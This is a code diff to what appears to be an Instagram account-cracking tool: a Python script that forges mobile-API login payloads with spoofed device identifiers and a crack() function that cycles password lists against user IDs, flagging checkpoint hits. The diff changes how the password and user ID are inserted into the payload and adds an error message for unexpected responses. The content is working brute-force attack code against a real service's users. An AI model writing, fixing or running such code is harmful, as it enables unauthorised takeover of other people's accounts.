@@ -89,16 +89,14 @@ def create_instagram_headers(device_hash):
 def create_login_payload(uid, pw, device_hash):
     """Create encoded login payload for Instagram API"""
     timestamp = int(time.time())
-    encoded_uid = urllib.request.quote(str(uid))
-    encoded_pw = urllib.request.quote(str(pw))
     
     return (
         f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{device_hash[:16]}%22%2C'
         f'%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C'
         f'%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A'
-        f'{timestamp}%3A{encoded_pw}%22%2C%22family_device_id%22%3A%22{uuid.uuid4()}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C'
+        f'{timestamp}%3A{pw}%22%2C%22family_device_id%22%3A%22{uuid.uuid4()}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C'
         f'%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C'
-        f'%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{encoded_uid}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C'
+        f'%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{uid}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C'
         f'%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{device_hash[:16]}%22%2C'
         f'%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{uuid.uuid4()}%22%2C'
         f'%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C'
@@ -191,6 +189,7 @@ def crack(uid, password_list, total_count):
                 print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
                 continue
             else:
+                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
                 
     except requests.exceptions.Timeout:
